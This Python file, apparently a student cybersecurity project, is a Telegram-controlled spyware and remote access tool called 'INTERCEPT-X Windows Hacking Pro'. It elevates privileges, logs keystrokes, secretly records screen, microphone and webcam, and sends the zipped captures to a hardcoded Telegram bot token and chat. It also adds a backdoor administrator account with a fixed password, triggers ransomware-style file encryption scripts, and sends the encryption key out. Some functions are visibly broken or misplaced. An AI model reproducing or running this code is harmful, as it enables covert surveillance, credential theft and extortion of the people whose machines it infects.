#! "C:\Users\polde\OneDrive - HvA\Cyber_Security_AD_1_2024\blok3\programming\new\env\Scripts\python"

# Peter Oldenburger - CyberSecurityAD - CS105 - Adnan Kazan & Michael Drent - 
# Main.py - INTERCEPT-X Windows Hacking Pro - Telegram Bot Beta 1.0


# Importeer benodigde bibliotheken en modules
import logging   #logging
import subprocess   #nieuwe processen starten, verbinding maken met hun input/output/error pipes, en hun return codes ophalen.
import os   #Biedt functies voor interactie met het besturingssysteem. Dit wordt gebruikt voor het bepalen van paden en het omgaan met bestanden.
import datetime   #werken met datums en tijden
import requests   #Wordt gebruikt om HTTP-verzoeken te maken. Dit is essentieel voor de communicatie met de Telegram API
import threading   #Maakt het mogelijk om taken in aparte threads uit te voeren, wat gebruikt wordt voor periodieke taken zoals het versturen van data naar Telegram.
import time   #Gebruikt voor time.sleep in periodieke taken en tijdmetingen, zoals bij het opnemen van video's.
import zipfile   #Wordt gebruikt voor het comprimeren van bestanden in een zip-bestand voordat ze naar Telegram worden verstuurd.
from telegram import Update   #Deze imports worden gebruikt voor het maken en beheren van de Telegram bot.
from telegram.ext import Updater, CommandHandler, CallbackContext   #Deze imports worden gebruikt voor het maken en beheren van de Telegram bot.
from pynput.keyboard import Key, Listener   #detecteren van toetsaanslagen als onderdeel van de keylogger functionaliteit.
import pyaudio   #opnemen van audio.
import wave    #opslaan van de opgenomen audio in het WAV-formaat.
import cv2   #opnemen van video en het maken van screenshots
import pyautogui    #maken van screenshots.
import sys   #Gebruikt voor het afhandelen van systeem-specifieke parameters en functies, zoals sys.exit en het printen van het Python executable pad.
print(sys.executable) # Voor Error en Debugging
import signal   #Gebruikt voor het afhandelen van signalen, zoals het netjes afsluiten van het script bij een SIGINT (Ctrl+C).
from colorama import init, Fore, Style   #Voor het kleuren van tekst in de console
import ctypes   #Staat interactie toe met C-code.
init(autoreset=True) #Reset
import mutagen # audio formats
from collections import Counter # Keylog - Not Functional = Deze module biedt gespecialiseerde container datatypen naast de ingebouwde containers zoals lijsten, tuples en dictionaries.
import string # Not-functional = constanten en klassen voor het werken met stringgegevens 
import matplotlib.pyplot as plt # Not-functional = MATLAB-achtige plotinterface voor het maken en aanpassen van figuren en plots
from elevate import *   #Gebruikt om beheerdersrechten te verkrijgen bij het starten van het script.


# Verkrijg beheerdersrechten
elevate()


# Configureer loggen voor debugging doeleinden
logging.basicConfig(level=logging.DEBUG, format='%(asctime)s - %(levelname)s - %(message)s')


# Functie om virtuele omgeving te activeren
def activate_virtual_environment(env_path):
    """Activate the virtual environment."""
    if sys.platform.startswith('win'):
        activate_script = os.path.join(env_path, 'Scripts', 'activate.bat')
    else:
        activate_script = os.path.join(env_path, 'bin', 'activate')
    subprocess.call([activate_script], shell=True)


# Functie om het script netjes af te sluiten bij ontvangst van een SIGINT (Ctrl+C) signaal
def signal_handler(sig, frame):
    print('Exiting...')
    sys.exit(0)

# Registreer de signaal handler voor SIGINT
signal.signal(signal.SIGINT, signal_handler)

# Telegram Token en Chat-OD
TOKEN = "6672103339:AAHQrAHVnH32XU-0-EOVhWaE0gKyMWLr2Mo"
CHAT_ID = "5517521840"

# Tijds Interval
SEND_INTERVAL = 60 

send_interval = 60 
# Tijds interval voor toetsaanslagen
batch_time = 5 

# Path waar/hoe deze stroken op te slaan.
file_path = 'keystrokes.txt' 

# File paths
KEYSTROKES_FILE_PATH = 'keystrokes.txt'
SCREENSHOT_FILE_PATH = 'screenshot.png'
AUDIO_FILE_PATH = "audio_record.wav"
VIDEO_FILE_PATH = "video_capture.avi"


# Ping
    # Ping Victim
def perform_ping(ip_address):
    """Performs a ping to the specified IP address and returns the result."""
    try:
        result = subprocess.run(["ping", "-n", "4", ip_address], capture_output=True, text=True)
        return result.stdout
    except Exception as e:
        return f"Failed to execute ping: {e}"

def ping_command(update: Update, context: CallbackContext):
    if not context.args:
        update.message.reply_text("Usage: /ping <IP_ADDRESS>")
        return
    
    # Get Victim IP
def get_ip_command(update: Update, context: CallbackContext):
    """Sends the machine's IP address to the Telegram chat."""
    ip_info = get_ip_address()
    update.message.reply_text(f"IP Address Information:\n{ip_info}")

def get_ip_address():
    """Gets the IP address of the current machine."""
    try:
        result = subprocess.run(["ipconfig"], capture_output=True, text=True)
        return result.stdout
    except Exception as e:
        return f"Failed to get IP address: {e}"
    

    # Extact
    ip_address = context.args[0]

    # Call
    ping_result = perform_ping(ip_address)
    
    # Stuur terug naar Telegram
    update.message.reply_text(ping_result)

# Check Admin User 
def check_admin_user_command(update: Update, context: CallbackContext):
    """Checks if an admin user exists and sends the result to the chat."""
    message = check_admin_user()
    update.message.reply_text(message)

def check_admin_user():
    """Check if the admin user exists on the system."""
    username = "dutchjinn"
    try:
        result = subprocess.run(["net", "user", username], capture_output=True, text=True)
        if "The command completed successfully." in result.stdout:
            return f"Admin user '{username}' is present."
        else:
            return f"Admin user '{username}' is not present."
    except subprocess.CalledProcessError:
        return "Failed to check for admin user."

# Create Admin user
def create_admin_user_command(update: Update, context: CallbackContext):
    """Creates an admin user and sends the result to the chat."""
    username = "dutchjinn"
    password = "hackeR888!"  
    result_message = create_admin_user(username, password)
    update.message.reply_text(result_message)

def create_admin_user(username, password):
    """Attempts to create an admin user on the system."""
    try:
        subprocess.run(["net", "user", username, password, "/add"], check=True)
        subprocess.run(["net", "localgroup", "Administrators", username, "/add"], check=True)
        return f"User {username} added as an Administrator."
    except subprocess.CalledProcessError as e:
        return f"Failed to add user {username}. Error: {e}"

# Wallpaper
    # Wallpaper Variablen
SPI_SETDESKWALLPAPER = 20
SPIF_UPDATEINIFILE = 0x1
SPIF_SENDCHANGE = 0x2

    # wallpaper style
def set_wallpaper_style():
    pass  

    # Wallpaper Image Path
def set_wallpaper(image_path):
    """Set the desktop wallpaper to the specified image."""
    set_wallpaper_style()
    ctypes.windll.user32.SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0, image_path, SPIF_UPDATEINIFILE | SPIF_SENDCHANGE)
    
def set_wallpaper_command(update: Update, context: CallbackContext):
    image_path = r'C:\Users\polde\OneDrive - HvA\Cyber_Security_AD_1_2024\blok3\programming\new\wallpaper888.jpg'
    try:
        set_wallpaper(image_path)
        update.message.reply_text("Wallpaper has been set to DutchJinn888.")
    except Exception as e:
        update.message.reply_text(f"Failed to set DutchJinn888 wallpaper: {str(e)}")


# Run Script
def run_script(script_name):
    """Runs a script based on the given script name."""
    script_path = os.path.join(os.getcwd(), script_name)
    try:
        subprocess.run([sys.executable, script_path], check=True)
        logging.info(f"{script_name} executed successfully.")
    except subprocess.CalledProcessError as e:
        logging.error(f"Failed to execute {script_name}. Error: {e}")


# Encrypt Files 
def encrypt_files_command(update: Update, context: CallbackContext):
    script_name = 'destroy-2-encrypt.py'
    try:
        run_script("destroy-2-encrypt.py")
        update.message.reply_text("Files have been encrypted.")
    except Exception as e:
        update.message.reply_text(f"Failed to encrypt files: {str(e)}")


# Decrypt Files
def decrypt_files_command(update: Update, context: CallbackContext):
    script_name = 'destroy-2-decrypt.py'
    try:
        run_script("destroy-2-decrypt.py")
        update.message.reply_text("Files have been decrypted.")
    except Exception as e:
        update.message.reply_text(f"Failed to decrypt files: {str(e)}")


# Crypt File/Key to Telegram
def show_key_command(update: Update, context: CallbackContext):
    """Handles the /showkey command to send the encryption key to Telegram chat."""
    try:
        send_key_to_telegram()
        update.message.reply_text("Encryption key sent to Telegram.")
    except Exception as e:
        logging.error(f"Failed to send encryption key: {e}")
        update.message.reply_text(f"Failed to send encryption key: {str(e)}")


# Notepad Paytime!  Contcact USSS   
def notepad_command(update: Update, context: CallbackContext):
    """Executes the external script 'destroy-1-notepad.py'."""
    script_path = os.path.join(os.getcwd(), 'destroy-1-notepad.py')
    try:
        subprocess.run([sys.executable, script_path], check=True)
        logging.info("'destroy-1-notepad.py' executed successfully.")
        update.message.reply_text("destroy-1-notepad.py executed successfully.")
    except subprocess.CalledProcessError as e:
        logging.error(f"Failed to execute 'destroy-1-notepad.py'. Error: {e}")
        update.message.reply_text(f"Failed to execute destroy-1-notepad.py: {str(e)}")


# Functies voor het interacteren met Telegram
    # Verstuur een tekstbericht naar een Telegram chat
def send_message_to_telegram(message):
    url = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
    try:
        response = requests.post(url, data={'chat_id': CHAT_ID, 'text': message})
        logging.debug(f"Sent message to Telegram: {response.status_code}")
    except Exception as e:
        logging.error(f"Error sending message to Telegram: {e}")


    # Verstuur bestanden zoals foto's, audio of video naar een Telegram chat
def send_data_to_telegram(file_path, is_photo=False, is_audio=False, is_video=False):
    url = f"https://api.telegram.org/bot{TOKEN}/sendDocument"
    files = {'document': open(file_path, 'rb')}

    if is_photo:
        url = f"https://api.telegram.org/bot{TOKEN}/sendPhoto"
        files = {'photo': open(file_path, 'rb')}
    elif is_audio:
        url = f"https://api.telegram.org/bot{TOKEN}/sendAudio"
        files = {'audio': open(file_path, 'rb')}
    elif is_video:
        url = f"https://api.telegram.org/bot{TOKEN}/sendVideo"
        files = {'video': open(file_path, 'rb')}
        
    try:
        response = requests.post(url, files=files, data={'chat_id': CHAT_ID})
        logging.debug(f"Sent {file_path} to Telegram: {response.status_code}")
    except Exception as e:
        logging.error(f"Error sending {file_path} to Telegram: {e}")


# Functies voor het opnemen van audio, video en screenshots 
        
     # Neem audio op voor een specifieke duur en sla het op als een bestand
def record_audio(output_filename, duration=5):
    CHUNK = 1024
    FORMAT = pyaudio.paInt16
    CHANNELS = 2
    RATE = 44100

    audio = pyaudio.PyAudio()

    stream = audio.open(format=FORMAT, channels=CHANNELS,
                        rate=RATE, input=True,
                        frames_per_buffer=CHUNK)

    print("Recording...")

    frames = []

    for i in range(0, int(RATE / CHUNK * duration)):
        data = stream.read(CHUNK)
        frames.append(data)

    print("Finished recording.")

    stream.stop_stream()
    stream.close()
    audio.terminate()

    wf = wave.open(output_filename, 'wb')
    wf.setnchannels(CHANNELS)
    wf.setsampwidth(audio.get_sample_size(FORMAT))
    wf.setframerate(RATE)
    wf.writeframes(b''.join(frames))
    wf.close()

    set_audio_duration_metadata(output_filename, duration)


    # Neem audio op voor een specifieke duur en sla het op als een bestand
def set_audio_duration_metadata(file_path, duration):
    try:
        if file_path.endswith('.mp3'):
            audio = MP3(file_path)
            audio.info.length = duration
            audio.save()
        elif file_path.endswith('.wav'):
            audio = mutagen.File(file_path)
            audio.info.length = duration
            audio.save()
        elif file_path.endswith('.ogg'):
            audio = OggVorbis(file_path)
            audio.info.length = duration
            audio.save()
        elif file_path.endswith('.flac'):
            audio = FLAC(file_path)
            audio.info.length = duration
            audio.save()
        elif file_path.endswith('.m4a'):
            audio = MP4(file_path)
            audio.info.length = duration
            audio.save()
        else:
            print("Unsupported audio format.")
    except Exception as e:
        print(f"Error setting audio duration metadata: {e}")



    # Neem video op voor een specifieke duur en sla het op als een bestand
def capture_video(duration=5, output_filename="video_capture.avi"):
    cap = cv2.VideoCapture(0)
    fourcc = cv2.VideoWriter_fourcc(*'XVID')
    out = cv2.VideoWriter(output_filename, fourcc, 20.0, (640, 480))
    start_time = time.time()
    while int(time.time() - start_time) < duration:
        ret, frame = cap.read()
        if ret:
            out.write(frame)
    cap.release()
    out.release()


    # Maak een screenshot en sla deze op
def take_screenshot():
    screenshot = pyautogui.screenshot()
    screenshot.save(SCREENSHOT_FILE_PATH)



# Stuur File naar telegram
def send_file_to_telegram(file_path):
    """Sends the file with keystrokes to Telegram chat."""
    try:
        url = f'https://api.telegram.org/bot{TOKEN}/sendDocument'
        with open(file_path, 'rb') as file:
            files = {'document': file}
            data = {'chat_id': CHAT_ID}
            response = requests.post(url, files=files, data=data)
            print("File sent to Telegram." if response.status_code == 200 else f"Failed to send file: {response.text}")
    except Exception as e:
        print(f"Error sending file to Telegram: {e}")


# Keystroke Definer Date/Time, When to etc..       
keystrokes = []
last_keystroke_time = datetime.datetime.now()

# Keystroke Pre-process (niet functioneel nu,beta)
def preprocess_keystrokes(keystrokes):
    cleaned_keystrokes = []
    prev_key = None
    for key in keystrokes:
        if key == "[ENTER]" and prev_key == "[ENTER]":
            continue
        if key.isprintable() or key == "[ENTER]":
            cleaned_keystrokes.append(key)
        prev_key = key
    return cleaned_keystrokes

# Convert Keystrokes to Text TXT 
def keystrokes_to_text(keystrokes):
    return ' '.join(keystrokes).replace("[ENTER]", "\n")

# Keystroke Analyse (niet functioneel nu, beta)
def perform_frequency_analysis(text):
    words = text.split()
    return Counter(words)

# Toets aanslagen naar File schrijven
def write_keystrokes_to_file(batch):
    batch = batch.replace("[ENTER]", "\n") 
    try:
        with open(file_path, 'a') as file:
            file.write(f"{batch}\n") 
    except IOError as e:
        print(f"Failed to write to file: {e}")
        
# Hoe om te gaan met key-aanslagen
def on_press(key):
    global last_keystroke_time
    if key == Key.esc:
        return False  
    try:
        now = datetime.datetime.now()
        if key == Key.enter:
            keystrokes.append("[ENTER]") 
        elif hasattr(key, 'char') and key.char.isalnum():
            keystrokes.append(key.char)
        if (now - last_keystroke_time).seconds >= batch_time:
            timestamp = now.strftime('%Y-%m-%d %H:%M:%S')
            batch = f"{timestamp}: {''.join(keystrokes)}"
            write_keystrokes_to_file(batch) 
            keystrokes.clear()
            last_keystroke_time = now
    except AttributeError:
        pass

# Versturen (Sending, write en sent interval etc)
def handle_sending():
    """Handles the periodic task of writing and sending keystrokes."""
    if keystrokes:
        now = datetime.datetime.now()
        timestamp = now.strftime('%Y-%m-%d %H:%M:%S')
        batch = f"{timestamp}: {''.join(keystrokes)}"
        write_keystrokes_to_file(batch)
        keystrokes.clear()
    send_file_to_telegram(file_path)
    threading.Timer(send_interval, handle_sending).start()

#Start Periodic verstuur taak
handle_sending()

# Informeer de Gebruiker dat de keylogger geactiveerd is.
print("Keylogger is running... Press ESC to quit.")


# Overige functies zoals het loggen van toetsaanslagen en het periodiek verzenden van data naar Telegram
def keylogger():
    with Listener(on_press=on_press) as listener:
        listener.join()


    # Functie om periodiek taken uit te voeren zoals het maken van screenshots, opnemen van audio/video en verzenden naar Telegram
def new_periodic_tasks():
    while True:
        # Ververs Captures
        take_screenshot()
        record_audio(AUDIO_FILE_PATH, duration=5)
        capture_video(duration=5, output_filename=VIDEO_FILE_PATH)
        
        # Maak ZIP met alle Data
        zip_filename = zip_data()
        
        # Verstuur de ZIP file
        send_data_to_telegram(zip_filename)
        logging.info(f"Data bundle {zip_filename} sent.")
        
        # Maakschoon
        os.remove(zip_filename)  # Remove the zip file after sending
        time.sleep(SEND_INTERVAL)  # Pause before next cycle


    # Functie om verzamelde data te comprimeren in een zip bestand
def zip_data():
    zip_filename = datetime.datetime.now().strftime('%Y-%m-%d_%H-%M-%S') + '.zip'
    files_to_zip = [KEYSTROKES_FILE_PATH, SCREENSHOT_FILE_PATH, AUDIO_FILE_PATH, VIDEO_FILE_PATH]
    with zipfile.ZipFile(zip_filename, 'w', zipfile.ZIP_DEFLATED) as zipf:
        for file in files_to_zip:
            if os.path.exists(file):
                zipf.write(file, arcname=os.path.basename(file))
    return zip_filename


# Functies voor Telegram commando's zoals /start, /stop, /status, etc.
    
def start(update: Update, context: CallbackContext) -> None:
    update.message.reply_text('DutchJinn Bot started!')
    send_message_to_telegram("DutchJinn Initializing BOT")

def stop(update: Update, context: CallbackContext) -> None:
    update.message.reply_text('DutchJinn Bot stopped!')

def status(update: Update, context: CallbackContext) -> None:
    update.message.reply_text('DutchJinn Bot is running!')

def shell(update: Update, context: CallbackContext) -> None:
    """Go into reversed shell"""
    cmd = ['cmd']
    subprocess.Popen(cmd)

def screenshot_command(update: Update, context: CallbackContext) -> None:
    """Take a screenshot and send it to the user."""
    take_screenshot()
    send_data_to_telegram(SCREENSHOT_FILE_PATH, is_photo=True)
    
def audio_command(update: Update, context: CallbackContext) -> None:
    """Send the audio file to the user."""
    record_audio(duration=5, output_filename=AUDIO_FILE_PATH)
    send_data_to_telegram(AUDIO_FILE_PATH, is_audio=True)

def video_command(update: Update, context: CallbackContext) -> None:
    """Send the video file to the user."""
    capture_video(duration=5, output_filename=VIDEO_FILE_PATH)
    send_data_to_telegram(VIDEO_FILE_PATH, is_video=True)
    

# Export Ecryption/Decryption Key naar Telegram Bot
def export_key_command(update: Update, context: CallbackContext) -> None:
    """Read the temporary key file and send its contents to Telegram."""
    temp_key_file = "temp_key_data.txt" 
    try:
        with open(temp_key_file, 'r') as file:
            encoded_key = file.read()
        message = f"Encryption Key: {encoded_key}"
        send_message_to_telegram(message)
        update.message.reply_text('Encryption key exported successfully.')
    except Exception as e:
        logging.error(f"Failed to export key: {e}")
        update.message.reply_text('Failed to export encryption key.')


# Exporteer Encrption.key naar telegram
def send_key_to_telegram():
    """Sends the encryption key to the specified Telegram chat."""
    key_file_path = "encryption_key.key"
    try:
        with open(key_file_path, 'rb') as file:
            key_data = file.read()
            key_hex = key_data.hex()

        message = f"Encryption Key: {key_hex}"
        url = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
        data = {'chat_id': CHAT_ID, 'text': message}
        response = requests.post(url, data=data)

        if response.status_code == 200:
            print("Key successfully sent to Telegram.")
            logging.info("Key successfully sent to Telegram.")
        else:
            print("Failed to send key to Telegram.")
            logging.error(f"Failed to send key to Telegram. Status Code: {response.status_code}")
    except FileNotFoundError:
        print("Encryption key file not found.")
        logging.error("Encryption key file not found.")
    except Exception as e:
        print(f"An error occurred: {e}")
        logging.error(f"An error occurred when sending key to Telegram: {e}")

# info in Telegram
def info(update: Update, context: CallbackContext) -> None:
    update.message.reply_text('DutchJinn Telegram. You can use /start, /stop, /status, /info, /shell, /screenshot, /audio, /video, /getip, /ping, /checkadmin, /createadmin, /setwallpaper, /encryptfiles, /decryptfiles, /showkey, /notepad commands.')

# Print Banner met kleur colorama import
def print_banner_with_colorama():
    orange_color = Fore.LIGHTRED_EX 

    banner = ['''  
              
       ....                              s                                .              .
   .xH888888Hx.                         :8                .uef^"      .x88888x.         @88>
 .H8888888888888:       x.    .        .88              :d88E        :8**888888X.  :>   %8P      u.    u.      u.    u.
 888*"""?""*88888X    .@88k  z88u     :888ooo       .   `888E        f    `888888x./     .     x@88k u@88c.  x@88k u@88c.
'f     d8x.   ^%88k  ~"8888 ^8888   -*8888888  .udR88N   888E .z8k  '       `*88888~   .@88u  ^"8888""8888" ^"8888""8888"
'>    <88888X   '?8    8888  888R     8888    <888'888k  888E~?888L  \.    .  `?)X.   ''888E`   8888  888R    8888  888R
 `:..:`888888>    8>   8888  888R     8888    9888 'Y"   888E  888E   `~=-^   X88> ~    888E    8888  888R    8888  888R
         "*88     X    8888  888R     8888    9888       8PWO  888E          X8888  ~   888E    8888  888R    8888  888R
   .xHHhx.."      !    8888  888R     8888    9888       888E  888E          488888     888E    8888  888R    8888  888R
  X88888888hx. ..!    "8888Y 8888"   ^%888*   ?8888u../  888E  888E  .xx.     88888X    888&   "*88*" 8888"  "*88*" 8888"
 !   "*888888888"      `Y"   'YP       'Y"     "8888P'  m888N= 888> '*8888.   '88888>   R888"    ""   'Y"      ""   'Y"
        ^"***"`                                  "P'     `Y"   888    88888    '8888>    ""                          8
                                                              J88"    `8888>    `888                                 8
                                                              @%       "8888     8%                                  8
                                                            :"          `"888x:-"                                    *
DutchJinn.com                                                                                                        8
                                                                                                                     8
                                                                                                                     8
                                                                   INTERCEPT-X Windows Hacker PRO       !    <------/*
              
              ''']

    for line in banner:
        print(f"{orange_color}{line}")


 # Hoofdfunctie waar het script mee begint   
            # Start het script, inclusief het activeren van de virtuele omgeving en het printen van een welkomstbanner
def main():
    env_path = r'C:\Users\polde\OneDrive - HvA\Cyber_Security_AD_1_2024\blok3\programming\new\env'
    activate_virtual_environment(env_path)

    print_banner_with_colorama()
    print("Welcome to DutchJinn! Please choose an action:")
    print("1. Run Windows Destroyer Terminal Version (Debugged)")
    print("2. Run Telegram Bot, Beta Version")
    print("3. Run DHCP Starvation")
    print("4. Exit")

    choice = input("Enter your choice (1/2/3/4): ")

    if choice == "1":
        print("Running DutchJinn Windows Destroyer...")
        subprocess.run(["python", "windows-destroyer.py"])
        print("Python Executable:", sys.executable)
        print("Python Path:", sys.path)
    elif choice == "2":
        print("Starting DutchJinn Telegram Bot...")
        start_telegram_bot() 
    elif choice == "3":
        print("Running DHCP Starvation...")
        subprocess.run(["python", "dhcp-starvation.py"])
    elif choice == "4":
        print("Exiting...")
        sys.exit(0)
    else:
        print("Invalid choice. Please enter 1, 2, 3, or 4.")


# Start de Telegram bot en andere achtergrondtaken
def start_telegram_bot():
    threading.Thread(target=new_periodic_tasks, daemon=True).start()
    threading.Thread(target=keylogger, daemon=True).start()

    updater = Updater(TOKEN)
    dp = updater.dispatcher

        # Register de command handelrs
    dp.add_handler(CommandHandler("start", start))
    dp.add_handler(CommandHandler("stop", stop))
    dp.add_handler(CommandHandler("status", status))
    dp.add_handler(CommandHandler("info", info))
    dp.add_handler(CommandHandler("shell", shell))
    dp.add_handler(CommandHandler("screenshot", screenshot_command))
    dp.add_handler(CommandHandler("audio", audio_command))
    dp.add_handler(CommandHandler("video", video_command))
    dp.add_handler(CommandHandler("export_key", export_key_command))
    dp.add_handler(CommandHandler("ping", ping_command))
    dp.add_handler(CommandHandler("getip", get_ip_command))
    dp.add_handler(CommandHandler("checkadmin", check_admin_user_command))
    dp.add_handler(CommandHandler("createadmin", create_admin_user_command))
    dp.add_handler(CommandHandler("setwallpaper", set_wallpaper_command))
    dp.add_handler(CommandHandler("encryptfiles", encrypt_files_command))
    dp.add_handler(CommandHandler("decryptfiles", decrypt_files_command))
    dp.add_handler(CommandHandler("showkey", show_key_command))
    dp.add_handler(CommandHandler("notepad", notepad_command))


    updater.start_polling()
    updater.idle()

# start main
if __name__ == "__main__":
    main()